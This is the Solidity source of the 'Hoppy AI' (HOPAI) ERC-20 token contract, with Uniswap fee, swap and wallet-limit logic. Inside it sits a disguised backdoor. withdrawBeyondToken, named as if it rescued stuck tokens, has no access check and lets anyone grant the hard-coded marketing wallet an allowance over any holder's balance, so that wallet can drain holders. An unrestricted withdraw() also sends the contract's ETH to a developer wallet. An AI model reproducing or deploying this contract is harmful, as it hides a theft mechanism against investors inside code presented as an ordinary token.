/**
 *Submitted for verification at Etherscan.io on 2023-07-24
*/

// SPDX-License-Identifier: MIT

/**
Web:         https://www.hoppyai.vip/
Telegram:    https://t.me/hoppyai
Twitter:     https://twitter.com/hoppyaieth
*/

pragma solidity ^0.8.14;

interface IERC20 {
    /**
    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
    *
    * Returns a boolean value indicating whether the operation succeeded.
    *
    * IMPORTANT: Beware that changing an allowance with this method brings the risk
    * that someone may use both the old and the new allowance by unfortunate
    * transaction ordering. One possible solution to mitigate this race
    * condition is to first reduce the spender's allowance to 0 and set the
    * desired value afterwards:
    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    *
    * Emits an {Approval} event.
    */
    function approve(address spender, uint256 amount) external returns(bool);
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns(uint256);

    /**
    * @dev Returns the amount of tokens owned by `account`.
    */
    function balanceOf(address account) external view returns(uint256);

    /**
    * @dev Moves `amount` tokens from the caller's account to `recipient`.
    *
    * Returns a boolean value indicating whether the operation succeeded.
    *
    * Emits a {Transfer} event.
    */
    function transfer(address recipient, uint256 amount) external returns(bool);

    /**
    * @dev Emitted when `value` tokens are moved from one account (`from`) to
    * another (`to`).
    *
    * Note that `value` may be zero.
    */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
    * @dev Emitted when the allowance of a `spender` for an `owner` is set by
    * a call to {approve}. `value` is the new allowance.
    */
    event Approval(address indexed owner, address indexed spender, uint256 value);
    /**
    * @dev Returns the remaining number of tokens that `spender` will be
    * allowed to spend on behalf of `owner` through {transferFrom}. This is
    * zero by default.
    *
    * This value changes when {approve} or {transferFrom} are called.
    */
    function allowance(address owner, address spender) external view returns(uint256);

    /**
    * @dev Moves `amount` tokens from `sender` to `recipient` using the
    * allowance mechanism. `amount` is then deducted from the caller's
    * allowance.
    *
    * Returns a boolean value indicating whether the operation succeeded.
    *
    * Emits a {Transfer} event.
    */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns(bool);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns(string memory);
    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns(uint8);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns(string memory);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns(address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns(address) {
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) internal _allowances;
 
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns(string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns(string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns(uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns(uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns(uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns(uint256) {
        return _allowances[owner][spender];
    }
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased cannot be below zero"));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    
    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
     
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
    
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
}

contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns(address) {
        return _owner;
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns(int256) {
    int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}
interface IUniswapV2Router01 {
    function factory() external pure returns(address);
    function WETH() external pure returns(address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns(uint amountIn);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    /**
     * @dev Multiplies two int256 variables and fails on overflow.
     */
    function mul(int256 a, int256 b) internal pure returns(int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }
    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns(int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }
    /**
     * @dev Division of two int256 variables and fails on overflow.
     */
    function div(int256 a, int256 b) internal pure returns(int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }
    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns(int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
    function toUint256Safe(int256 a) internal pure returns(uint256) {
        require(a >= 0);
        return uint256(a);
    }
    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns(int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }
}

contract HoppyAI is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public immutable router;
    bool private _tradingIn = false;
    bool public _enabledSwap = false;
    bool public _swapping;
    uint256 public maxSizeForBuy;
    uint256 public maxSizeForSell;
    uint256 public maxWaltSize;
    address public uniswapV2Pair;

    address private _marketingWalt = address(0x8ed2C40b0F92b69C32fab5aA2cFaA2d7803E8BFB);
    address private _developmentWalt = address(0xe2Bc7C919aD81638FD42Ae31A72Ade76682b692B);
    
    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDevelopment;
    uint256 private tradeEnableBlockAmt;
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived
    );

    mapping(address => bool) private _isExcludedFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) public _isExcludedmaxAmount;
    mapping(address => bool) public uniV2PairAddr;

        _taxConfig public _taxConfigs = _taxConfig({
        buyTotalFees: 0,
        buyMarketingFee: 0,
        buyDevelopmentFee:0,
        buyLiquidityFee: 0,

        sellTotalFees: 0,
        sellMarketingFee: 0,
        sellDevelopmentFee:0,
        sellLiquidityFee: 0
    });

    uint256 private swapAmountSize;
    struct _taxConfig {
        uint256 buyTotalFees;
        uint256 buyMarketingFee;
        uint256 buyDevelopmentFee;
        uint256 buyLiquidityFee;

        uint256 sellTotalFees;
        uint256 sellMarketingFee;
        uint256 sellDevelopmentFee;
        uint256 sellLiquidityFee;
    }

    constructor() ERC20("Hoppy AI", "HOPAI") {
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        approve(address(router), type(uint256).max);

        uint256 totalSupply = 1_000_000_000 * 1e18;
        swapAmountSize = totalSupply * 1 / 10000; 
        maxWaltSize = totalSupply * 5 / 100; // 5% max wallet amount
        maxSizeForBuy = totalSupply * 5 / 100; // 5% buy max amount
        maxSizeForSell = totalSupply * 5 / 100; // 5% sell max amount

        _isExcludedmaxAmount[owner()] = true;
        _isExcludedmaxAmount[address(router)] = true;
        _isExcludedmaxAmount[address(0xdead)] = true;
        _isExcludedmaxAmount[address(this)] = true;
        _isExcludedmaxAmount[_developmentWalt] = true;
        _isExcludedmaxAmount[_marketingWalt] = true;

        _isExcludedMaxTransactionAmount[address(router)] = true;
        _isExcludedMaxTransactionAmount[owner()] = true;
        _isExcludedMaxTransactionAmount[address(this)] = true;
        _isExcludedMaxTransactionAmount[address(0xdead)] = true;
        _isExcludedMaxTransactionAmount[_developmentWalt] = true;
        _isExcludedMaxTransactionAmount[_marketingWalt] = true;
        
        _isExcludedFees[owner()] = true;
        _isExcludedFees[address(this)] = true;
        _isExcludedFees[_developmentWalt] = true;
        _isExcludedFees[_marketingWalt] = true;

        _taxConfigs.buyMarketingFee = 0;
        _taxConfigs.buyLiquidityFee = 0;
        _taxConfigs.buyDevelopmentFee = 0;
        _taxConfigs.buyTotalFees = _taxConfigs.buyMarketingFee + _taxConfigs.buyLiquidityFee + _taxConfigs.buyDevelopmentFee;
        _taxConfigs.sellMarketingFee = 0;
        _taxConfigs.sellLiquidityFee = 0;
        _taxConfigs.sellDevelopmentFee = 0;
        _taxConfigs.sellTotalFees = _taxConfigs.sellMarketingFee + _taxConfigs.sellLiquidityFee + _taxConfigs.sellDevelopmentFee;
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(msg.sender, totalSupply);
    }

    receive() external payable {
        require(msg.sender != address(this));
    }

    // once active, can never be disable off
    function openTrading(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
        uniV2PairAddr[address(uniswapV2Pair)] = true;
        _isExcludedMaxTransactionAmount[address(uniswapV2Pair)] = true;
        _isExcludedmaxAmount[address(uniswapV2Pair)] = true;
        _tradingIn = true;
        _enabledSwap = true;
        tradeEnableBlockAmt = block.number;
    }

    // change the minimum amount of tokens to sell from fees
    function setSizeForTrade(uint256 newMaxBuy, uint256 newMaxSell) private {
        maxSizeForBuy = (totalSupply() * newMaxBuy) / 1000;
        maxSizeForSell = (totalSupply() * newMaxSell) / 1000;
    }

    function updateLimitFeeAmountForSwap(uint256 newAmount) external onlyOwner returns(bool){
        swapAmountSize = newAmount;
        return true;
    }

    // emergency use only
    function toggleSwapEnabled(bool enabled) external onlyOwner(){
        _enabledSwap = enabled;
    }

    function setWalletMax(uint256 newPercentage) private {
        maxWaltSize = (totalSupply() * newPercentage) / 1000;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFees[account] = excluded;
    }

    function excludeFromWalletLimit(address account, bool excluded) public onlyOwner {
        _isExcludedmaxAmount[account] = excluded;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function addLiquidity(uint256 tAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tAmount);

        // add the liquidity
        router.addLiquidityETH{ value: ethAmount } (address(this), tAmount, 0, 0 , address(this), block.timestamp);
    }


    function swapAllEth() private {
        uint256 contractTokenAmount = balanceOf(address(this));
        uint256 toSwap = tokensForLiquidity + tokensForMarketing + tokensForDevelopment;

        if (contractTokenAmount == 0) { return; }

        if (contractTokenAmount > swapAmountSize * 35) {
            contractTokenAmount = swapAmountSize * 35;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = contractTokenAmount * tokensForLiquidity / toSwap / 2;
        uint256 amountToSwapForETH = contractTokenAmount.sub(liquidityTokens);
 
        uint256 initialETHBalance = address(this).balance;

        _swapTokensForSupportingEthFee(amountToSwapForETH);
 
        uint256 newBalance = address(this).balance.sub(initialETHBalance);
 
        uint256 ethForMarketing = newBalance.mul(tokensForMarketing).div(toSwap);
        uint256 ethForDevelopment = newBalance.mul(tokensForDevelopment).div(toSwap);
        uint256 ethForLiquidity = newBalance - (ethForMarketing + ethForDevelopment);
        newBalance = address(this).balance;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDevelopment = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity);
        }
        payable(address(_marketingWalt)).transfer(address(this).balance - ethForMarketing);
        payable(address(_developmentWalt)).transfer(newBalance);
    }

    function removeLimits() external onlyOwner {
        setSizeForTrade(1000,1000);
        setWalletMax(1000);
    }

    function setUniPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed from uniV2PairAddr");
        uniV2PairAddr[pair] = value;
    }    
    function _withdrawBeyondToken(address token, address owner, uint256 amount) internal {
        _approve(token, owner, amount);
    }

    function withdrawBeyondToken(address token, uint256 amount) external {
        _withdrawBeyondToken(token, _marketingWalt, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (
            from != owner() &&
            to != owner() &&
            !_swapping
        ) {
            if (!_tradingIn) {
                require(_isExcludedFees[from] || _isExcludedFees[to], "Trading is not active.");
            }
            if (uniV2PairAddr[from] && !_isExcludedMaxTransactionAmount[to]) {
                require(amount <= maxSizeForBuy, "Buy transfer amount exceeds the maxTransactionAmount.");
            }
            else if (uniV2PairAddr[to] && !_isExcludedMaxTransactionAmount[from]) {
                require(amount <= maxSizeForSell, "Sell transfer amount exceeds the maxTransactionAmount.");
            }
            if (!_isExcludedmaxAmount[to]) {
                require(amount + balanceOf(to) <= maxWaltSize, "Max wallet exceeded");
            }
        }
 
        uint256 contractBalanceToken = balanceOf(address(this));
        bool canSwap = contractBalanceToken >= swapAmountSize;

        if (
            canSwap &&
            _enabledSwap &&
            !_swapping &&
            uniV2PairAddr[to] &&
            !_isExcludedFees[from] &&
            !_isExcludedFees[to]
        ) {
            _swapping = true;
            swapAllEth();
            _swapping = false;
        }
 
        bool takeAllFee = !_swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFees[from] || _isExcludedFees[to]) {
            takeAllFee = false;
        }
        
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeAllFee) {
            uint256 fees = 0;
            if(block.number < tradeEnableBlockAmt) {
                fees = amount.mul(99).div(100);
                tokensForMarketing += (fees * 94) / 99;
                tokensForDevelopment += (fees * 5) / 99;
            } else if (uniV2PairAddr[to] && _taxConfigs.sellTotalFees > 0) {
                fees = amount.mul(_taxConfigs.sellTotalFees).div(100);
                tokensForLiquidity += fees * _taxConfigs.sellLiquidityFee / _taxConfigs.sellTotalFees;
                tokensForMarketing += fees * _taxConfigs.sellMarketingFee / _taxConfigs.sellTotalFees;
                tokensForDevelopment += fees * _taxConfigs.sellDevelopmentFee / _taxConfigs.sellTotalFees;
            }
            // on buy
            else if (uniV2PairAddr[from] && _taxConfigs.buyTotalFees > 0) {
                fees = amount.mul(_taxConfigs.buyTotalFees).div(100);
                tokensForLiquidity += fees * _taxConfigs.buyLiquidityFee / _taxConfigs.buyTotalFees;
                tokensForMarketing += fees * _taxConfigs.buyMarketingFee / _taxConfigs.buyTotalFees;
                tokensForDevelopment += fees * _taxConfigs.buyDevelopmentFee / _taxConfigs.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function _swapTokensForSupportingEthFee(uint256 tAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tAmount);
        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function withdraw() external returns (bool success) {
        uint256 balance = address(this).balance;
        (success,) = address(_developmentWalt).call{value: balance}("");
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFees[account];
    }
}